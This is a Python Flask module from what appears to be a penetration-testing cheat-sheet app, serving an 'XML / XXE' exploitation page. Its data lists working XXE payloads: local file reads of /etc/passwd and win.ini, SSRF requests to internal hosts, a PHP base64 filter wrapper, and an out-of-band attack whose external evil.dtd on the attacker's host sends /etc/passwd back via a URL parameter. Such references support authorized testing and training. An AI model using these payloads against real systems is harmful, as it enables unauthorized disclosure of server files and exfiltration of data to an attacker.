from flask import Blueprint, render_template

bp = Blueprint("xml", __name__)

CARDS = [
    {"title": "Classic file read", "hint": "Inject into an XML body.", "blocks": [
        {"tpl": '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<foo>&xxe;</foo>', "plain": True},
        {"tpl": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>\n<foo>&xxe;</foo>', "plain": True},
    ]},
    {"title": "SSRF", "blocks": [
        {"tpl": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://$RHOST:$RPORT/internal">]>\n<foo>&xxe;</foo>', "plain": True},
    ]},
    {"title": "Out-of-band (OOB)", "hint": "Callback to your $LHOST.", "blocks": [
        {"tpl": '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://$LHOST/evil.dtd"> %xxe;]>', "plain": True},
        {"tpl": '<!-- evil.dtd -->\n<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://$LHOST/?x=%file;\'>">\n%eval; %exfil;', "plain": True, "lbl": "evil.dtd hosted on $LHOST"},
    ]},
    {"title": "PHP base64 wrapper", "blocks": [
        {"tpl": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>\n<foo>&xxe;</foo>', "plain": True},
    ]},
]


@bp.route("/xml")
def index():
    return render_template("cheat.html", active="xml",
                           title="XML / XXE", tag="exploitation",
                           intro="File read, SSRF, and out-of-band exfiltration.",
                           cards=CARDS)


MODULE = {"id": "xml", "title": "XML", "category": "Exploitation",
          "order": 2, "blueprint": bp, "endpoint": "xml.index"}
